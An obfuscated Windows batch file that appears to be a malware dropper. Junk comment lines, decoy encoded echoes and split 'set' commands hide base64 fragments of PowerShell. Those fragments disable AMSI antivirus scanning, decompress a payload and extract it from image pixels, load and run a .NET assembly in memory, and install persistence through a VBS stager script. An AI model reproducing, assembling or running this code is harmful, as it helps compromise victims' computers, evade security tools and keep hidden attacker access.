@echo off
Se%RNgf%t "OsybKDFI=XJzdCAxCiRhc3NlbWJseVR5cGUgPSAkbXNjb3JsaWIuR2V0VHlwZSgnU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHknKQokbG9hZE1ldGhvZCA9ICRhc3NlbWJseVR5cGUuR2V0TWV0aG9kcyhbU3l"
REM ruby cipher undergrowth undergrowth shadow circle kiln circle strobe
SE%Vzp%T "QVeQVHbJWk=ADfoFsCnitb"
REM binary kappa kiln glimmer
REM zenith vision glimmer guard vertex binary
REM sword mirage strobe sword pixel pixel phantom phantom
echo aUFuTXZ3bU5EVW9MMnlpMFZtU2xoSXYydEtyUVdUVzB5NzFmeUVvckxFUWdnb3QwcnR2RlJWb21ySkxaRU1MSnFPNlFZYXFjaQ== >nul 2>&1
echo dm9BbExLaTRXc0wxZFpWWjlCSDZJaTJ5cEdkTVhJZGlwN1RLbWJQYkVqNVpYMVFhWnFFazhpMA== >nul 2>&1
Se%Yoz%t "PqYreYcooVVd=KIiMebEaiEvwhiFuWtabKQTeRdBFLzS"
REM vertex odyssey strobe kiln beacon undergrowth vertex zenith guard circle
se%TCOEA%T "JavydM=HZfjKtpksJxGj"
se%xKBv%t "qFsqHZ=LUmaNiSePUqLSzdi"
REM mirage guard zenith lance fathom twilight mirage kiln odyssey pixel
REM cipher hawk zenith glimmer beacon kiln binary echo echo
REM shadow twilight mirage phantom
REM valley vertex lance fathom
echo ZmVCaTV2R1Z5TGhMQjA3eXE2enFOZ1ZWUFJUM0FVYkZxY2ZBR1FHOHpYSWFOZzhGektka0xWMlg3Yg== >nul 2>&1
se%OEL%T "LlvZFZQOaCdIYRd=CFIlniiGwXDeCMaE"
sE%ADxv%T "aNsbKf=VRiAenfyXO"
REM hawk ruby clearing
sE%wmypn%T "GShjykGNjtB=0ZhaWxlZCcKJGFzID0gW1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgkYXQpCmlmICgkYXMpIHsKJGYgPSAkYXMuR2V0RmllbGQoJGFmLCAnTm9uUHVibGljLFN0YXRpYycpCmlmICgkZikgeyAkZi5TZXRWYWx1ZSgkbnVsb"
SE%rkZ%t "STEHOE=mEhyJHrEwAzkufsWgYtrStyf"
REM undergrowth undergrowth kiln sword fragment
Se%uXXK%t "eppfQf=PhhJijLitAIiZZdcyDBlsehCgkuINAV"
REM shadow strobe odyssey sword twilight cipher fathom
REM beacon fathom mirage shadow lance strobe core
REM valley vision odyssey odyssey shadow mirage circle hawk clearing
SE%nTGK%T "FYuDbYeqgLiUEHV=qcQbvhmbvOUixLNV"
se%LID%t "ykBoqfBj=nngcBsFHCJPUiUInLhuMnbKNVYWjNao"
REM cipher twilight guard
REM undergrowth kiln core delta fragment undergrowth valley
sE%DtE%t "tLGTlo=nLMxzmsUNbZJtjC"
SE%qTMKa%t "MAAxNz=JaedmYvYgKYgQCQ"
se%nRjAB%t "qtDAXoD=b3IgJFBFUlNJU1RFTkNFX1VSTCAtZXEgIiIpIHsKTG9nLVNpbGVudCAiWyFdIFBlcnNpc3RlbmNlIHNraXBwZWQ6IFlvdSBoYXZlbid0IGVkaXRlZCB0aGUgVVJMIGluIHRoZSAucHMxIGZpbGU"
se%tauTN%t "LIEaVJGuKb=EHkNtXlKlhmPnCRIGxAQEsACdfznxzuQCz"
REM binary valley binary odyssey vision strobe ruby
sE%MCo%T "QMtRZzShsl=sfycKDsjGgOpQewKwyhjeiQAlwvcp"
REM ruby guard twilight core
echo dWdTbmM1WlVYZ3VrQ1VaT3d4VDVJU1JTTnhYRjc5b2ZzSUprWldERnNER2xKampJSkxJZ290eVNHRENmd3B5c29DOFI5cDE4V2U= >nul 2>&1
REM echo delta lance circle kiln fragment vision clearing odyssey
REM kappa mirage beacon guard
sE%zFxD%t "OXXrQiQcK=tFBnWIpAkPtezDAcTgSylOdQNMzr"
REM guard ruby kiln odyssey valley fathom pixel zenith
REM vertex cipher binary shadow sword vision
se%aqZd%t "kkeBGGxDOvTsxYr=RYXtyqLarsMGaCyOP"
REM beacon core beacon mirage cipher fathom undergrowth mirage guard binary
echo djBKRWhsYTFVUzRBSWRHdUZMcGFpU2JTeVVGakdsV2FWYm95d1ZCTW96THhTQWhZQ01mRVF3dDk2OWZWbEtweWNJMTlteDhwRjJyYTRlNG4= >nul 2>&1
sE%BOUK%T "QtwgNzJqyp=yqeRyFiYOzLgmxmPtnnfL"
REM delta ruby fathom echo mirage pixel phantom shadow vertex
echo RWw4aWlIbnExRW5CakpKQnU3UUtiSmt6N2k0RUxrNjREdEZKNzVMclVTdkw3Zk5TU0NQVTZUbQ== >nul 2>&1
echo enA3VjZBdDFVbHJDN3dLdHRSbEFYWmE0dkdjeHFzY1NNM3FRYkN2WkcwQ1ZvTFVPMzFsdzFiRnpVT2xWc0kybWl4SFdHN21ZZXZHdkc5Ug== >nul 2>&1
se%NWiQB%t "wJaKsAEdbHAr=IudHh0IgpMb2ctU2lsZW50ICJbKl0gQ2hlY2tpbmcgcGVyc2lzdGVuY2UgY29uZmlndXJhdGlvbi4uLiIgIkdyYXkiCmlmICgkUEVSU0lTVEVOQ0VfVVJMIC1tYXRjaCAiUkVQTEFDRV9XSVRIIiAt"
Se%Sld%t "fTAFCAMREMu=yHiHyRDlfBbOeuOnRNWBcf"
sE%vVaJF%t "cYQdKfaH=RlbmN5IHJlcXVlc3RlZDogJCgkZS5OYW1lKSIgIlllbGxvdyIKcmV0dXJuICRudWxsCn0KW1N5c3RlbS5BcHBEb21haW5dOjpDdXJyZW50RG9tYWluLmFkZF9Bc3NlbWJseVJlc29sdmUoJG9u"
SE%rRC%t "ZTdhQc=MztHMEbeyRbJPznuNnbNlmxiDo"
echo TDIxVjNxdHRJUGtOeVdRWXBtcmRWY29qWFZzRmNaQUVTQktwUDZ5NE52WlJZbEhpVTZBeUx5OHV2NFhxUHk0YU1o >nul 2>&1
sE%xOz%T "DQAKlxCt=HZic0NvbnRlbnQgPSBAIgpEaW0gc2hlbGwsIGZzbywgdGVtcEZpbGUKU2V0IHNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKU2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2N"
echo WDNUa0U1ZXo0dEZBZkxSbTlpTUdnR1JRRnpNaVU3YUMyenRqeFBGTw== >nul 2>&1
REM guard vision shadow zenith
REM phantom kappa vision
sE%wwo%t "pbhbMKOyN=9tcHJlc3Npb24uR1ppcFN0cmVhbSgkY21zLCBbU3lzdGVtLklPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpCiRvdXRNcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbQokZ"
se%NWz%T "wYJEXynz=rXPfxyNJyKQofYOSPv"
Se%zfdDr%t "QQeSULOXnBl=ijreMnoGgTTTPdzLIzpcpPQklSXkKRJeZfP"
REM lance odyssey core kiln valley delta core mirage hawk
REM circle clearing vertex strobe
echo S2JTSTFiNGg5QTBwVndLekVTWmZHbWV5anVCcU1lOHFJQjFjaW1sOTBQeVlGcHB5SUJFSkFrSjhlcEtvdWh0bWQzeFY= >nul 2>&1
echo c1dVOEphUmtRS2FCUWRHMmRVR1pJUG9rV2NBZ0pGTW9PWHVPVWV2ZXR6eXJwUUNVVWk= >nul 2>&1
REM phantom twilight circle echo fathom vision delta
REM binary strobe undergrowth
REM circle kappa glimmer core valley twilight lance twilight hawk
REM twilight fragment binary phantom valley fragment twilight vision binary twilight
REM lance echo fathom
se%qjtoj%T "PpNqBphQ=RtLtMeNbBfBmGRwaBHsbCLJRpoTZp"
se%kuQx%t "lybmSwTFZ=ZnVuY3Rpb24gRGlzYWJsZS1BTVNJIHsKdHJ5IHsKJGF0ID0gJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQScgKyAnbXNpJyArICdVdGlscycKJGFmID0gJ2Ftc2knICsgJ0luaXQnICsgJ"
REM phantom sword fragment vision clearing fathom mirage
echo WVEzRWJMVHBVdGZCV0hmaFhEWXd2RjdBelhtN2dOVDJoWXp4ZTN3d0RST0s5cHJzMFdyVmdQcGhBcEd3dHhnam1JSmtCajdtWk5UMVlqZw== >nul 2>&1
echo SlpBOXVId2FCOENPeXpQTnVVYldWUDRtUjNmOWp5WkhRdWFTWEJkNXQ0VkJhV1B4SGNvUGxxbDN0Y2FPc1NXaU1BTzBUMHVNd3NoRGs= >nul 2>&1
REM kiln delta vertex beacon beacon kiln undergrowth kappa delta
REM strobe core undergrowth sword fathom sword zenith odyssey fathom pixel
Se%BWk%T "OWUvaeUv=NUWsnGBOmjhaAdBQErPQX"
REM phantom lance sword fragment guard fragment ruby shadow guard
REM zenith strobe fragment kiln phantom core ruby ruby kappa delta
REM fragment vertex pixel
REM glimmer zenith clearing core sword twilight
SE%rjK%t "PPNyaLbtgAac=attikTfYgiSYHgtidJPTSXSiE"
Se%Qokg%T "CcqJaL=EUpKQpMb2ctU2lsZW50ICJbK10gQXNzZW1ibHkgTG9hZGVkOiAkKCRsb2FkZWQuRnVsbE5hbWUpIiAiR3JlZW4iCiRlbnRyeSA9ICRsb2FkZWQuRW50cnlQb2ludAppZiAoJGVudHJ5KSB7Ckx"
Se%heUrl%T "IXWnoHG=SQvtgaDrkctmuHtPLbkDbDRpYIDjxq"
se%bza%t "ejjFvpLkAzGFie=NwJZPsvJyXvWwVKJZJMr"
REM vertex circle odyssey
se%jkk%t "LayhNobh=YvLKVjJzeg"
REM circle odyssey kappa zenith valley binary odyssey zenith
REM fathom fragment core circle
echo Nnk2YkxPenRsUTNkM2VaMnY0dHZYVGRoT3A1ekVmcFI5ZGIwaEEzYkxaVUN2a3VwdlhoaXU3bFZJVE9wQ2Z0MG1P >nul 2>&1
echo MDFEV1NxbVFTaVhrd2pUc2xuSjk0SktFME5FaWRrWEc5S2lDVUNlekpUZUVjWVg5dkFI >nul 2>&1
sE%Udz%T "dYEWKY=oUFYolZsUkDLAOiolBuZvQOdGtZsKJ"
echo YmdjVkRsc05QUnBnT1JJWU4yTFhzRXRqV3RJOHo3aUJzRHNTaHpIOUgwRHpsdlpDMEp4dTZjeGNzVDRBTU9HVHlvNkt1MGtlTUs3 >nul 2>&1
REM cipher core echo strobe
se%WrEjP%t "XGwlIobf=QPBYwfwCSICVTRWdykAYlmyfGjh"
REM delta hawk kiln guard ruby hawk
se%oEKTX%t "jJKiLad=NnChoRxWsOMXdRRkxAcN"
se%emR%T "MPmTCEsAgJjD=VhWbopNYtmoXJaDziu"
SE%watII%T "MGHAGKrjeHpRf=xZMZOcWNiBZfWwjMQQhruNpVThRmjYfUJ"
REM guard glimmer glimmer odyssey kappa
se%tIAC%t "jMhnVTe=chbZLCWLefdiEDptrJHRcpKJ"
echo Q1hPdkpPT3piV2lFdTJiNWZ5eElZWmJvbXV2RWdjYWRuMldrMjlGNzNyN1Z4UlllMms= >nul 2>&1
REM lance vertex shadow
se%GQHZ%t "VWijagrow=akdvNMiEacnNmXqjqbA"
Se%xRuHe%t "CTqYnbrDwEh=NEoQRJgrCiIYp"
se%eWPV%t "NJIJspPVcfvzd=TCVWXUNtedPBiTuRWdFmPDnKYXrYRZv"
REM core vertex mirage glimmer binary undergrowth
Se%dnmhq%t "MyssPtnfqWa=eAztwAlZEVDDeUsYjEDKhGtGOMPPaRpfBj"
echo SGJtdXk0R1ZuaElaZHYwTHlzS29MaHF1UVh1anlPb2cyd2pUR3ppRXIzWVJaMUdiUDNCVTNU >nul 2>&1
REM lance hawk strobe sword delta zenith undergrowth
se%MFIXs%T "ZGEIIKhEShEgVqp=CRLTmlaoHqFWYScbpGTvyBMktmoY"
Se%PmFs%t "bmkRctFgZ=gPqXhLKEurd"
sE%ZFBD%T "LrlBQRrbZScpJ=ZbZrzlEgybCRFvtmMFCBRwpeKGbcEia"
echo UExVMVZLQWV5aWhsRk0yUU01QkZKMHphWlNZVzR4c3FRcHM0UGJxR29EUkczdTJZUnZ5S3JnVlBYYmY= >nul 2>&1
REM odyssey sword circle core guard valley
Se%ZHg%t "ZAQEEk=rLMyNTjMYQEpYPhrRiLzYjKKvIcjVWSrl"
REM valley mirage kiln zenith sword kappa fathom
REM pixel undergrowth phantom guard kappa fragment odyssey mirage delta
REM twilight phantom lance fathom pixel guard phantom
echo OENxN0xlaFEzNjAyaXhDTzJwWjg4Y0J6VEhORXM3d3J0eTF2MGdkWTNVcjY5WEZQVzBJQUtTczZtY25MN3pSMFk1S1F4VQ== >nul 2>&1
echo cW5qdVYwQ0R2RHhvT0FLNmEwU0dreE1hWGtQclJsVGU4S1kzNlB1MjlQY3BZdkQ= >nul 2>&1
REM sword odyssey phantom shadow hawk guard pixel kiln undergrowth
sE%TVvX%T "CtUEsBUKRtgpqK=YbztWdGaoglRvyUMBXoFmCdye"
REM vertex beacon binary hawk core kappa hawk echo phantom delta
REM core ruby core guard
REM phantom fragment shadow
SE%LdYDL%T "qpedsO=PFPhABXgyOFynxAU"
REM kiln fragment lance echo
sE%tclIU%T "gkfdtAMNkJoqR=IgcNhxxXzJSO"
sE%UkF%t "kBiheomXTkTV=UKUCbDsRlkScELqhDWpFlbEnlmbyz"
REM valley odyssey strobe twilight
SE%uWLC%t "iyAXiKqcwoeCvE=PJbyxNyXnzKaqEtVyBMY"
se%sAa%t "knTdKGj=SEGFdKCnMpYxAJhSNcrE"
REM lance shadow valley
Se%STnj%T "kGrJVEkvhzVEb=CnbuWeZocaKfAkwejOiBwPbbxhYCyAGoRuD"
SE%Zls%t "ZdXDklQSMaz=lsFeqSvXIclmVQowXuXuxjsueN"
REM core echo core twilight fathom pixel clearing
SE%LLK%t "QGrnJaaYan=FNuiRntRyZoaAzuHshBxDaS"
REM clearing lance undergrowth
echo NFVtVDBScDJzd3pCd1M3dFFITm1RNjhHc2Z4WmpjYllVQjBXcmR5RzFScQ== >nul 2>&1
REM kappa vertex cipher circle mirage
Se%btVQR%T "YGEqFFg=jmIgyUEVsbtVLWRSHHaFsf"
sE%mHbh%t "wPVZUeOCZr=oGNssYIAwKA"
REM twilight pixel beacon phantom fragment fathom fragment undergrowth
se%lLC%T "DIfvqoEkPjMGPEJ=VLkaDHwmkRw"
se%CQKI%T "cRHJavUJL=hKvHuvlBDkfFLOLzJYOSIJvFphoPpkXpHk"
REM kappa guard echo lance beacon guard
REM mirage fathom zenith vision phantom kiln pixel clearing
se%lXrT%T "YRUeXiW=uUdnUFJlpSimZcuCuw"
REM core strobe ruby binary shadow vision kappa echo
echo SXRQUFFvR3RjUHV5bEREaFRqMjBoNktuSVlYOHZlWWs2WjhuaE5ubUxVejBvR2FKU3FkQlp1 >nul 2>&1
REM hawk vision cipher
sE%Drz%T "zqgHODXzIZG=KnUFyVSTYB"
REM binary vertex hawk core circle
REM twilight phantom vertex twilight cipher
SE%pHwPJ%t "BPAgMjELCBo=b2ctU2lsZW50ICJbKl0gRW5jb2Rpbmcgc3RhZ2VyIFVSTCBmb3IgVkJTLi4uIiAiR3JheSIKJGNockFycmF5ID0gKCRTdGFnZXJVcmwuVG9DaGFyQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHsgW2ludF0kXyB9KSAtam9pbiAiLCIKJ"
REM pixel vision fragment phantom core ruby fragment
echo cEFyb1B2Z3JGa1ZkRHJBZU85a0U2VG55bHdCanpFelRNczRwWVladDA3RTk3V1M4eFpDckUyZnBXUmxFRG5TZ2VnelNvY1ptWWk= >nul 2>&1
Se%wAxu%T "YwhYaRPb=ySmRuaZXXiaYJklUnfGMwZbOdR"
REM odyssey kiln ruby
REM mirage twilight vision zenith circle fathom mirage
SE%nGbzi%T "fTPcfQFxgyWNT=VmwskBTLokTWyYdEozjX"
echo NlJSVEN6eVhEamNEdVJFUnliU1hUUlowSlZmR3Z3YUxmWVpYQjhOTA== >nul 2>&1
SE%LBWa%T "dffAWRJYsLGLchq=zBHrDDwXEjcExg"
sE%UiCkM%t "EAiEoy=BFfGIFxrcJ"
SE%duTeL%t "rxzKkywL=cfuZWZIPaKpccjjsbX"
REM guard lance odyssey glimmer kiln cipher lance circle glimmer vision
SE%IIZ%t "TdwmslqsbUc=JTSVNURU5DRV9VUkwKfQpBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EcmF3aW5nCiRvblJlc29sdmUgPSBbU3lzdGVtLlJlc29sdmVFdmVudEhhbmRsZXJdewpwYXJhbSgkcywgJGUpCkxvZy1TaWxlbnQgIlshXSBEZXBlbm"
REM vertex ruby vision odyssey kiln odyssey cipher phantom circle
REM odyssey core ruby glimmer lance echo echo fathom vision phantom
Se%PCe%T "slQkltCoTGw=fEKcNAvlVFpHOhCftZwBlJkXBcD"
sE%pJp%t "RHxUOlWRmmPF=PEVnrdBZpoIHsZLsTgergMSTKceirgXOfR"
REM glimmer fathom odyssey
sE%LWQO%T "DGcZFcgrYLlTR=vJbzSKRWebPdoz"
Se%Ijw%t "jytywGa=UjqGEFMtbveKDyHYpOgNRbtCJVGGHT"
REM zenith strobe kappa delta ruby kiln clearing
REM glimmer valley mirage core zenith ruby
Se%ywAgh%T "npBbuJfiu=WAqPICxhsZGqkwV"
echo ZlhvQUVEbmpoenRKd042d1FmOVVMbUZjZXdrbHh1SEJSSDUyOW1MbmNDUVlpWg== >nul 2>&1
echo SG13T0VuTHUxMks3S3JPRm1XZlg2dWNZdlZ2WmRlZnNxbXljOE5aaGZ1cjhi >nul 2>&1
se%xdh%t "jIWfqQNzL=Rkb25lID0gJGZhbHNlCmZvciAoJHkgPSAwOyAkeSAtbHQgJGg7ICR5KyspIHsKZm9yICgkeCA9IDA7ICR4IC1sdCAkdzsgJHgrKykgewppZiAoJHkgLWVxIDAgLWFuZCAoJHggLWVxIDAgLW9yICR"
SE%DubU%T "NuGGjVkr=DKMwvVkkNxAyiAtHjdOmdgYRYk"
se%TucL%t "IPQwlSQKOxnM=fTZwTxUPARHXFdQtghfrDe"
REM sword phantom undergrowth vision
REM valley fragment ruby delta vertex pixel clearing
se%jzX%T "AWSHBZcJcnevSpq=wLqyXCdvHnZr"
SE%vcO%t "fNujGnRGv=TnadGfzbPTqRENORUXLXposljjyNQMa"
sE%kHVlf%T "iQSNKnjhWYRRK=BtPcjRHBAovQWYxtBtLvdBFWIMAAug"
REM phantom core kappa beacon ruby vision binary fathom
sE%jxOR%t "ClFTbZGpujJi=IKaWYgKFRlc3QtUGF0aCAkdmJzUGF0aCkgewpMb2ctU2lsZW50ICJbKl0gUGVyc2lzdGVuY2UgYWxyZWFkeSBpbnN0YWxsZWQuIFNraXBwaW5nIHdyaXRlLiIgIkdyZWVuIgpyZXR1cm4KfQpM"
echo ZGZhZWhzaW1QOFA5bmw0WTR6Q093b1R2enJnR1JXWGVFMXpnQjhMSWM5cmM3MWJISmNBR29GTndoYXZScW92UTNROURPeDdvRlU= >nul 2>&1
SE%glB%t "RIVnqJ=OGWuqHDnYzDa"
REM cipher circle mirage strobe guard shadow cipher fragment
REM echo clearing odyssey zenith pixel
sE%GOFV%t "LbiOiTBqhtO=eXixKvQxZOXueONIDDxs"
echo MlpTa002M09ndWZHenE4cW9JUE9nWVJqOExqcXhuSmI5QUxWdkRCTFhZcFN0QVFySFZCQ29PNEhyT1FFNk5USXVBSk1ZdnZsWk0wQQ== >nul 2>&1
echo U3VNQ25xWWNxVGJwd1ZXOVJzZ0VIc2pyUzhBRXR6NTI2SlZFM0d3ekd2Rlh3a3ZvSVBRdmljWXh4emxVMzhGazNGc013dzBVNU9zU2RaZU0= >nul 2>&1
REM kappa pixel guard echo
Se%hMOyz%t "XsRQdEVqo=cYFVWScJHbZolziKxukGUWIGJNCESUNjnTc"
sE%Bvt%t "cIsqhxOqcUshVf=KPVQwIFJHCMTerovyzwaejVc"
echo ZVlNbUU0MWFGMTZNWFk5dW1VbzdlM1VWcDdBTG5meTUzOFRNNGhwM1pTVEE0a05HMzB2aGJKZTZpSktNU1hnbzRCeGg1bTBj >nul 2>&1
se%QsgB%t "eXMqMZYpANu=vc2UoKTsgJG1zLkRpc3Bvc2UoKQpMb2ctU2lsZW50ICJbKl0gRGVjb21wcmVzc2luZy4uLiIKJGNtcyA9IE5ldy1PYmplY3QgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgsJHBhY2tlZCkKJGdzID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uQ2"
REM strobe odyssey odyssey
echo djRhWHI1dXJMOUhXNzEwQnVkN3BOcnZXaWxDUzhudkhtOHRvNjBaRjdxblVIRXhYeTBsSm1HTA== >nul 2>&1
REM clearing kappa shadow shadow hawk beacon hawk sword
se%Ilq%t "vOaTDGTpU=FbaplcQRvdykPBRGYnsMsciiT"
se%kJATO%t "jcDMWvuSXQ=MNdvuusRwKspsBRKEAipCwWtd"
sE%uCZeA%t "CFrHWOsWgJHqQ=AzpBxrYckCGgepwRixlcGwSaHY"
REM kappa phantom zenith phantom vision cipher delta undergrowth vertex
REM valley core ruby cipher phantom clearing fragment
SE%IGYG%t "VnSgMkfcykURDA=VbzdsUZDpSuoKhSgXFK"
SE%BzdE%t "qKahvyIrgPxtSk=QUXkUIQHoGxnotqwkysCkBPYmIrn"
REM valley circle valley ruby sword
REM valley core phantom lance fragment mirage fathom sword phantom
se%AYYZ%T "fmsRtPtwlWZaR=zbmXGsPzhnqmnfpHwWplCXdk"
echo bVhQaUxGUkh4bEFYbURIVTU2ZjZIMHA2TnFIV2FNU2FWUXZib0d5aFBCekNId3BnWEh4aXNDQWMzVGJVYUZ6MDJnNzd1QUYzd1dybA== >nul 2>&1
SE%NdSvK%t "KuRHfF=ZdquTuHgeMlYJnACOGYBWOHzScWnD"
echo Z01XMzNTZXU3TVkwN1dMRWhSeUJiOEpPNzhjZDdkOXdzVjBDa3M2UXlNczZ0TFZGV1N3b0ZEVWRROEFW >nul 2>&1
sE%SyE%T "QPZYGmUFQ=INwHDvBQZserfmflVjBYPbiwcYgm"
echo VUFTOGdqTGJkWDB1YTVVYXRZVHpuSUR3Z0M0OFd1dFJFcHJFRWJtY2hPbkhXbFpqZA== >nul 2>&1
REM pixel core sword fragment sword fragment sword cipher
echo bG9QeUdidEszeFI5eE00aERDNVJsYVVoV2dlcGdnaXRUbUFoUTR5NGJxUWw1dlVZTnpoQUdmN29veFF1aHVkcXZQRmpKZGg4cU1wc0VjZFA= >nul 2>&1
REM fragment odyssey kiln circle odyssey
se%DDmLT%T "LXmjBDPFZtxdv=nvFzSUDIfPx"
REM ruby vertex phantom hawk clearing kappa phantom undergrowth clearing strobe
REM fathom mirage glimmer vertex kappa kiln
sE%RdlUr%T "CYMzigSdtaROFe=gihHGPHdaQnKooOkp"
REM zenith beacon clearing zenith echo phantom kiln core
echo N0NMRXd3bmxFdUhsUDFqZVVJME9PZVN4cDFCTDZqVmpvWXU4cmF1QjhoQVdJYUlrblFVNFBYWnRhVFdOY0lCZA== >nul 2>&1
sE%gAI%T "ZKpyfyvb=tGctDlbYssb"
SE%NmGW%t "IDyhkDsynpN=YytFHkxLhQCJcl"
echo YXN4YllKSTM0Y2J4Yzh1NzlhcXVOcmIzQ0czV20wd3lyZWFWRjFKbWNQVU5qSldYVmNCS0I4 >nul 2>&1
echo NnliSU1weFhXcWRCQjhObjkzSTk1bzQwQ01jS24zSnJ0RlB1S2lObjVscDYyZVNiZ2xiTXQ4eTFUWQ== >nul 2>&1
SE%lFuxa%t "DwyNmXDHy=PPoBodywRgmpiZQDMQyJUFY"
REM clearing circle phantom shadow circle core
REM fragment glimmer glimmer core ruby circle mirage circle phantom clearing
REM odyssey glimmer vision
Se%acDrA%T "DNkvyAjx=OKekOFSHYJARfXaZqUbRcwVGdjzAPG"
echo NVRmRGwxNkpZNER4bFlyenlKVXRnSGk3MGdXdkhkYzlxZ1pNQ2wwNA== >nul 2>&1
Se%Besp%T "YUDwPfy=vQZPiYEvWGxh"
se%XDdk%T "ifDXAdt=wIrueeMEHTbtMBgUGOqkoOyYrTTMocHflN"
sE%cdd%T "JewtwpBTSFqoWdu=rfeKUkMstEBkSytfhYcVzWpJ"
echo emFUem1VcDhReFdiYjc1dlA5ZVVSbG5URENTd21DbFVacm9EbTl6WUpJZFRDVQ== >nul 2>&1
REM ruby odyssey vertex beacon sword echo vision vision kiln
REM strobe delta echo cipher circle sword lance
sE%mQyzu%T "hxBIud=ZkIOdQKuBXylhelgaIl"
sE%VXr%t "ZTsSamoCLY=RiaaYjWVFWrKGjousDVDtKXqeif"
se%JOtT%T "NmWnxNyDqIUdoJE=CeSSZfImBJuxznndLLyXgktDIKtGR"
REM hawk vertex vertex undergrowth binary shadow
REM vertex mirage fathom twilight mirage pixel zenith
Se%XCJJJ%t "FEWJytF=UQUwgRVJST1JdICQoJGV4Lk1lc3NhZ2UpIiAiUmVkIgpMb2ctU2lsZW50ICRleC5TdGFja1RyYWNlICJSZWQiCn0KW1N5c3RlbS5BcHBEb21haW5dOjpDdXJyZW50RG9tYWluLmFkZF9VbmhhbmRsZWRFeGNlcHRpb24oJG9uRXhjZXB0a"
echo amtYbEN3a2xMOG95SzJxdXA5cUpXQ21zUGFGbnFEdDgwcHJ0b0drb0tXQUE= >nul 2>&1
Se%afkZ%T "oRkfygsCt=bPxZgAbfHLtXBO"
sE%dCSnC%t "DmTXvAfJ=rKSxTfwtIKzNUczhdpOtBEae"
sE%TvCPj%t "SsUBqq=HVXidqSFFWYEoE"
REM beacon lance phantom echo
SE%aZjO%t "RqUujREzZw=uVptiBzGYvlUGS"
REM strobe undergrowth pixel undergrowth delta kappa glimmer guard kiln ruby
REM glimmer sword vision pixel echo
REM vision mirage circle
Se%rHyn%t "DcnfNKLUL=gZfpEWcrQuGPkBbuArsewLHSmCuFjd"
se%JzHTa%T "rBwmsLzsTZtE=kAWrUDTmfKTtFtsSkyC"
REM vertex fragment zenith core fathom shadow circle vision
echo UUNkOGh2V0pvSzFSZFJXTVpJeUpkVDZxbFE4aFFCUTU2ZjJLWTBTdXc4Uw== >nul 2>&1
Se%HWEd%T "esLPEdXValrVWB=aTDtzgkFgd"
REM glimmer twilight zenith glimmer kiln twilight valley
echo b0NGY0pGM2prVXJMdUFKbmRYQlpFVkFDSmpPV29uV3Zva0NxS2RCRjNQVUh2NW1DWlk2MUo0czN1ZjlocXcwag== >nul 2>&1
echo Vk80QjNZU0FzMjMzd1gzZG9PUVZVaURIYjM1M1d2b0tjeXZ0Q2VDa2U0R25WbFIxeXZxZklkN0N6TjI2 >nul 2>&1
echo WDk2d3VRa0Q2RzFGbmJMRjVJUWRCcDh2U2lMNDF4TkNOcDhFUWUzT0pqR3ho >nul 2>&1
REM clearing shadow echo twilight
se%QXp%T "pkzgIzwOgQe=ZW50ICJbK10gRXh0cmFjdGVkIFBheWxvYWQgTGVuZ3RoOiAkbGVuZ3RoIGJ5dGVzIgokZXh0cmFjdGVkID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W2J5dGVdCi"
REM vertex mirage odyssey kappa kappa hawk echo vertex zenith
se%AMJFw%t "nQtIWuotqAOnUKf=STLJgQZMRdXvyWqrPqUTWCBtzCODkULAKMY"
echo Yk44SnprUWVuUUh3Y0xVQ3dFa3NSZHJFVzBtbmZoaE5qemhkSTZlakJkdXhGeVY= >nul 2>&1
Se%knY%t "EsLbKA=bKvVvQlqoOkfhAEMoDwkVeiLquHFdr"
REM lance cipher circle guard undergrowth echo lance fathom twilight guard
Se%eFe%t "qLmmqwPWhjASQcF=dFlbYBvwWvUoyUXyuZVLmtpxNxJCXCANSRx"
